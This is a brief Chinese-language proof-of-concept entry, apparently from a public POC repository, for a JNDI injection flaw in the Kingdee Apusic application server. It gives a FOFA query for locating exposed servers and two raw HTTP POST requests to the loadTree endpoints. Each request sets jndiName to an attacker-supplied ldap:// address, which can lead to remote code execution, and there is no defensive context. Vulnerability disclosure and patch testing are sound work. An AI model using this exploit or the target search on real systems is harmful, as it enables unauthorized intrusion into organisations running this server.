## 金蝶Apusic应用服务器loadTree JNDI注入漏洞

## fofa
```
app="Apusic应用服务器"
```

## poc
```
POST /appmonitor/protect/jndi/loadTree HTTP/1.1
host:127.0.0.1

jndiName==ldap://地址

POST /admin/protect/jndi/loadTree HTTP/1.1
host:127.0.0.1

jndiName==ldap://地址
```

![a519acd405e2e60c00108378f8410c8d](https://github.com/wy876/POC/assets/139549762/faa32ae9-f7b0-4a76-9990-74635d28bd2f)

![1dc3f827f335c01618f9dd9c4b39832b](https://github.com/wy876/POC/assets/139549762/6eff9f3b-df75-4008-b713-db61a32739bd)

![584c726b09f954433d5c3248ac5c1368](https://github.com/wy876/POC/assets/139549762/dfe99f4f-d6eb-4869-a2f8-59d792d9dac4)

##漏洞来源
- https://mp.weixin.qq.com/s/iEHmFOKq5LT2x9Hp1ysLIw
